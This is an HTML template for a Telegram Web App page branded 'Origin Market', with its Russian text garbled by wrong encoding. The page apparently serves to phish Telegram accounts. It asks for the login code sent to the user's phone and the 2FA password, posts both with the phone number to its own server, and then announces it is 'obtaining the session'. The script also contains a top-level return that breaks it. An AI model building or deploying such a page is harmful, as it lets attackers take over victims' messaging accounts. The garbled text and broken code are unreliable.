<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è - Origin Market</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles-v2.css') }}?v=4">
    <script src="https://telegram.org/js/telegram-web-app.js?59"></script>
    <style>
        /* –°—Ç–∏–ª–∏ –¥–ª—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã –≤–≤–æ–¥–∞ –∫–æ–¥–∞ */
        .verification-container {
            width: 100%;
            max-width: 350px;
            padding: 20px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            min-height: 100vh;
            justify-content: center;
        }

        .verification-title {
            font-size: 1.5rem;
            font-weight: bold;
            color: #ffffff;
            margin-bottom: 10px;
        }

        .verification-description {
            font-size: 1rem;
            color: #cccccc;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .code-input-container {
            width: 100%;
            margin-bottom: 20px;
        }

        .code-input {
            width: 100%;
            padding: 15px 20px;
            font-size: 1.1rem;
            border: 2px solid #00F0F9;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            text-align: center;
            letter-spacing: 2px;
            font-weight: bold;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        .code-input:focus {
            outline: none;
            border-color: #00F0F9;
            box-shadow: 0 0 20px rgba(0, 240, 249, 0.5);
            background: rgba(255, 255, 255, 0.15);
        }

        .code-input::placeholder {
            color: #888888;
            letter-spacing: normal;
        }

        .button-container {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .confirm-button {
            width: 100%;
            padding: 15px 20px;
            font-size: 1.1rem;
            font-weight: bold;
            background: linear-gradient(135deg, #00F0F9, #0088cc);
            color: #1A1C2F;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 240, 249, 0.3);
        }

        .confirm-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 240, 249, 0.4);
        }

        .resend-button {
            width: 100%;
            padding: 12px 20px;
            font-size: 1rem;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }

        .resend-button:hover {
            background: rgba(255, 255, 255, 0.2);
            border-color: rgba(255, 255, 255, 0.5);
        }

        .back-button {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            border: none;
            padding: 10px 15px;
            border-radius: 8px;
            cursor: pointer;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        .back-button:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        .error-message {
            color: #ff6b6b;
            font-size: 0.9rem;
            margin-top: 10px;
            display: none;
        }

        .success-message {
            color: #51cf66;
            font-size: 0.9rem;
            margin-top: 10px;
            display: none;
        }

        /* –ê–Ω–∏–º–∞—Ü–∏–∏ */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .verification-container > * {
            animation: fadeIn 0.6s ease-out;
        }

        .verification-container > *:nth-child(2) { animation-delay: 0.1s; }
        .verification-container > *:nth-child(3) { animation-delay: 0.2s; }
        .verification-container > *:nth-child(4) { animation-delay: 0.3s; }
        .verification-container > *:nth-child(5) { animation-delay: 0.4s; }
    </style>
</head>
<body>
    <div class="verification-container">
        <!-- –ö–Ω–æ–ø–∫–∞ –Ω–∞–∑–∞–¥ -->
        <button class="back-button" onclick="goBack()">‚Üê –ù–∞–∑–∞–¥</button>
        
        <!-- –ó–∞–≥–æ–ª–æ–≤–æ–∫ -->
        <h1 class="verification-title">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è</h1>
        
        <!-- –û–ø–∏—Å–∞–Ω–∏–µ -->
        <p class="verification-description">–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –∫–æ–¥ –Ω–∞ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</p>
        
        <!-- –ü–æ–ª–µ –¥–ª—è 2FA (—Å–∫—Ä—ã—Ç–æ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é) -->
        <div class="password-container" id="passwordContainer" style="display: none; width: 100%; margin-bottom: 20px;">
            <input 
                type="password" 
                class="code-input" 
                id="passwordInput" 
                placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç 2FA" 
                autocomplete="off"
            >
        </div>
        
        <!-- –ü–æ–ª–µ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ -->
        <div class="code-input-container">
            <input 
                type="text" 
                class="code-input" 
                id="codeInput" 
                placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥" 
                maxlength="5"
                autocomplete="off"
            >
        </div>
        
        <!-- –ö–Ω–æ–ø–∫–∏ -->
        <div class="button-container">
            <button class="confirm-button" onclick="verifyCode()">
                –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å
            </button>
            
            <button class="resend-button" onclick="resendCode()">
                –û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ
            </button>
        </div>
        
        <!-- –°–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–∞—Ö/—É—Å–ø–µ—Ö–µ -->
        <div class="error-message" id="errorMessage"></div>
        <div class="success-message" id="successMessage"></div>
    </div>

    <script>
        // –ü–æ–ª—É—á–∞–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∏–∑ localStorage
        const phoneNumber = localStorage.getItem('phoneNumber');
        
        // –ï—Å–ª–∏ –Ω–æ–º–µ—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω, –≤–æ–∑–≤—Ä–∞—â–∞–µ–º—Å—è –Ω–∞ –≥–ª–∞–≤–Ω—É—é
        if (!phoneNumber) {
            window.location.href = '/';
            return;
        }
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ —Ç–æ–º, —á—Ç–æ –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω
        showSuccess('üì± –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
        
        // –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—Ç–∞ –Ω–∞–∑–∞–¥
        function goBack() {
            window.history.back();
        }
        
        // –§—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–¥–∞
        async function verifyCode() {
            const code = document.getElementById('codeInput').value;
            const password = document.getElementById('passwordInput').value;
            
            if (!code || code.length !== 5) {
                showError('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥');
                return;
            }
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É
            const confirmBtn = document.querySelector('.confirm-button');
            confirmBtn.textContent = '–ü—Ä–æ–≤–µ—Ä—è–µ–º...';
            confirmBtn.disabled = true;
            
            try {
                const response = await fetch('/api/verify_code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: phoneNumber,
                        code: code,
                        password: password
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showSuccess('‚úÖ –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω! –ü–æ–ª—É—á–∞–µ–º —Å–µ—Å—Å–∏—é...');
                    setTimeout(() => {
                        window.location.href = '/dashboard';
                    }, 2000);
                } else if (result.need_password) {
                    showSuccess('üîê –¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å 2FA');
                    document.getElementById('passwordContainer').style.display = 'block';
                    document.getElementById('passwordInput').focus();
                } else {
                    showError(result.error || '–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–¥–∞');
                }
            } catch (error) {
                showError('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º');
            } finally {
                confirmBtn.textContent = '–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å';
                confirmBtn.disabled = false;
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞
        async function resendCode() {
            try {
                const response = await fetch('/api/resend_code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: phoneNumber
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showSuccess('–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–≤—Ç–æ—Ä–Ω–æ!');
                } else {
                    showError(result.error || '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞');
                }
            } catch (error) {
                showError('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º');
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –ø–æ–∫–∞–∑–∞ –æ—à–∏–±–∫–∏
        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            const successDiv = document.getElementById('successMessage');
            
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            successDiv.style.display = 'none';
        }
        
        // –§—É–Ω–∫—Ü–∏—è –ø–æ–∫–∞–∑–∞ —É—Å–ø–µ—Ö–∞
        function showSuccess(message) {
            const errorDiv = document.getElementById('errorMessage');
            const successDiv = document.getElementById('successMessage');
            
            successDiv.textContent = message;
            successDiv.style.display = 'block';
            errorDiv.style.display = 'none';
        }
        
        // –ê–≤—Ç–æ—Ñ–æ–∫—É—Å –Ω–∞ –ø–æ–ª–µ –≤–≤–æ–¥–∞
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('codeInput').focus();
        });
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ Enter
        document.getElementById('codeInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                verifyCode();
            }
        });
        
        // –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –≤–≤–æ–¥–∞ —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä–∞–º–∏
        document.getElementById('codeInput').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>